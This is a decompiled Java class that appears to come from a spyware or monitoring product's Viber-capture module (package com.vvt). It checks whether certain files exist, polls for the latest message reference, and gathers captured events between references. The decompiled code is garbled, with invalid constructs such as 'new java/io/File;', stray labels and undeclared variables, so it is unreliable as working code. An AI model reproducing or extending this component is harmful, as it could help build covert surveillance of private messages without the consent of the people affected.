package com.vvt.capture.viber.a.a.a.a;

import android.os.SystemClock;
import com.vvt.ak.a;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.viber.mode.full.c;
import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private long d = -1;
  
  private boolean b()
  {
    boolean bool1 = false;
    String[] arrayOfString = c.a();
    int i = arrayOfString.length;
    int j = 0;
    for (;;)
    {
      if (j < i)
      {
        String str = arrayOfString[j];
        File localFile = new java/io/File;
        localFile.<init>(str);
        boolean bool2 = localFile.exists();
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      j += 1;
    }
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = a;
    if (bool1) {}
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      bool1 = b();
      if (bool1)
      {
        long l2 = com.vvt.capture.viber.a.a.b.b();
        bool1 = false;
        Object localObject = null;
        l3 = l2;
        int j = 0;
        for (;;)
        {
          boolean bool3 = l3 < l1;
          if (bool3) {
            break;
          }
          int k = 10;
          if (j >= k) {
            break;
          }
          l3 = 6000L;
          SystemClock.sleep(l3);
          long l4 = com.vvt.capture.viber.a.a.b.b();
          int i = j + 1;
          j = i;
          l3 = l4;
        }
      }
      boolean bool4;
      bool2 = b;
    }
    catch (Exception localException)
    {
      bool2 = c;
      if (bool2) {}
      l3 = l1;
      bool4 = l3 < l1;
      if (bool4) {
        break label162;
      }
    }
    if (bool2) {}
    long l3 = this.d;
    for (;;)
    {
      Long localLong = Long.valueOf(l3);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = a;
      if (bool2) {}
      return localFxSimpleEventReference;
      label162:
      this.d = l3;
    }
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    try
    {
      bool2 = b();
      if (bool2)
      {
        long l1 = com.vvt.capture.viber.a.a.b.b();
        long l2 = com.vvt.capture.viber.a.a.b.a(paramInt);
        long l3 = 1L;
        l2 -= l3;
        ArrayList localArrayList2 = com.vvt.capture.viber.a.a.b.a(l2, l1);
        localArrayList1.addAll(localArrayList2);
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return localArrayList1;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = com.vvt.capture.viber.a.a.b.a(l1, l2);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/a/a/a/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */